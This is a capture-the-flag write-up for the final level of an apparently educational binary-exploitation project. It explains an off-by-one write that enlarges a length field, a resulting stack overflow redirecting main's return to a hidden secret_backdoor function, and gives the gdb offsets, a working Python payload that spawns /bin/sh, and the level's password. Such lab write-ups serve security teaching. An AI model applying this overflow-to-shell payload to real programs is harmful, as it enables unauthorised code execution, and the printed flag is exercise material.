## LEVEL 09
---
### For a better understanding of the levels and the solutions, I recommend you to read the [disassemble file](./asm/level09.asm) and the [source file](./src/level09.c). This README only contains the most important parts to solve the level.
---
### Security
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```
For this bonus level, NX is enabled. This means that we can't execute external code but the stack canary is disabled. And PIE is enabled, so the addresses of the functions are hidden.
---

Wow, this is the last level of the project and of this security branch. Before celebrating the end of the project, we need to solve this final level.

This level is slightly different from the previous ones. Firstly, the code is in x86_64 architecture instead of x86_32. Since we have already encountered three executables in the same architecture throughout this project, this shouldn't be a big issue. We just need to adjust the register names and the way arguments are stored.

The second difference is that this level has Position-Independent Executable (PIE) enabled. This means that the addresses of functions are hidden before running the program. However, we are fortunate that the addresses of the functions remain the same because the stack canary is disabled. Therefore, we just need to run the program once to obtain the addresses. To set a breakpoint, we will need to use the following syntax:
```
(gdb) b* main+0x1a
```
Since the address is not defined before running the program, we'll need to search for a solution to solve this level.

The first thing I noticed in the code is the presence of a function called `secret_backdoor`. Although this function is never called in the code, it's evident that we have to call it to obtain the flag, as it invokes `system()`. Therefore, let's find a way to call this function.

If we need to call this function, it implies that we have to overwrite a pointer to execute it. The first idea that comes to mind is to overwrite the return address of the `main()` function, just as we did in many previous levels.

But how can we achieve this? To answer that question, we'll need to delve deeper into the code and find a way to overflow the memory.

```c
typedef struct s_struct
{
    char msg[0x8c]; // 0x0
    char username[0x28]; // 0x8c
    int len; // 0xb4
} t_struct; // len = 0xc0
```

This is the structure used in `handle_msg` and this is our gate to overflow the memory.

```c
void set_msg (t_struct *msg)
{
    char buffer[0x400];
[...]
    fgets(buffer, 0x400, stdin);
    strncpy(msg->msg, buffer, msg->len);
}

void set_username (t_struct *msg)
{
    char buffer[0x80];
[...]
    int32_t _rbp = 0;
    while(_rbp <= 0x28 && buffer[_rbp] != 0)
    {
        msg->username[_rbp] = buffer[_rbp];
        _rbp++;
    }
[...]
}
```

These two functions seem to hold the answer to our question. The `set_msg` function has a buffer of 0x400 bytes, which is sufficient to overflow the memory. However, the value of `msg->len` limits the number of bytes we can copy into the structure. To achieve memory overflow, we need to set `msg->len` to a larger value.

To accomplish this, we can utilize the `set_username` function. This function has a small vulnerability: it copies one byte more than the size of the `username` value. Consequently, it overwrites a byte of the `len` variable. This is perfect for our purposes!

Therefore, our inputs should look like this:
```
First input : padding(40) + "int8_max"
Second input : padding(EIP offset) + "address of secret_backdoor"
```

Perfect so two variables are missing, the padding and the address of `secret_backdoor`. Let's start by finding the `secret_backdoor` address.

```shell
(gdb) i func
[...]
0x000055555555488c  secret_backdoor
[...]
```

Now we need to find the padding. Notice that the padding is different from x86_32 because the registers are bigger. For example the return address is stored in $ebp+8 instead of $ebp+4.

```shell
(gdb) x/a $rbp+8
0x7fffffffe568:	0x555555554abd <main+21>
(gdb) x/a $rbp-0xc0
0x7fffffffe4a0:	0xa
(gdb) p 0x7fffffffe568 - 0x7fffffffe4a0
$1 = 200
```

So the padding is 200 bytes. Now we have all the information we need to solve the level.

Please note that at the end of the payload, I will add "/bin/sh". This is because the `secret_backdoor` function calls `system(buffer)`, and this buffer is a user input.

```shell
$ (python -c 'print "\x90"*40+"\xff"; print "\x90"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"; print "/bin/sh"'; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Perfect ! We got the flag ! This is the end of this project.

